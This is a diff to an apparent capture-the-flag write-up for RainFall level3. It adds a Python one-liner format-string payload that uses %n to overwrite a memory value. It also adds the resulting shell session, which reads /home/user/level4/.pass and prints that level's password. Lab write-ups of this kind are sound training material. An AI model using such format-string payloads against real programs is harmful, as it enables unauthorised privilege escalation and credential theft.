@@ -59,7 +59,11 @@ AAAAAAAAAAAA 200 b7fd1ac0 b7ff37d0 41414141 41414141 41414141
 we can use %n to write to the `0x804988c` the value require for the cmp to be true
 
 ```sh
-cat <(python -c "print '\x8c\x98\x04\x08' + 'a' * 60 + '%4\$n'") - ./level3
+level3@RainFall:~$ cat <(python -c "print '\x8c\x98\x04\x08' + 'a' * 60 + '%4\$n'") - | ./level3
+�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Wait what?!
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 ```
 
 and we got sh as user level4
